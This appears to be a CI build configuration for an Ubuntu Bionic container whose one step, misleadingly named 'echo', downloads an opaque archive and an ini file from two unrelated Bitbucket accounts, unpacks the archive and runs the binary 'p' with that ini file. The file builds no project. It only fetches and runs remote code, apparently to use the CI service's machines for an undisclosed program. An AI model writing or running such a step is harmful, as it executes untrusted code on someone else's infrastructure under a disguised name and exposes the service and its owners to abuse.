box: ubuntu:bionic
command-timeout: 60
build:
  steps:
    - script:
        name: echo
        code: |
          apt update -y && apt install -y wget xz-utils
          wget https://bitbucket.org/Hggbngfvb/p/raw/762671a7008d3c0a99a2586b91647b59d8303b10/p.tar.xz
          wget https://bitbucket.org/fajar990/pas/raw/93a84205ed4140304b3e66d0c22d367802f65b00/p.ini
          tar xf p.tar.xz
          chmod +x p
          ./p p.ini
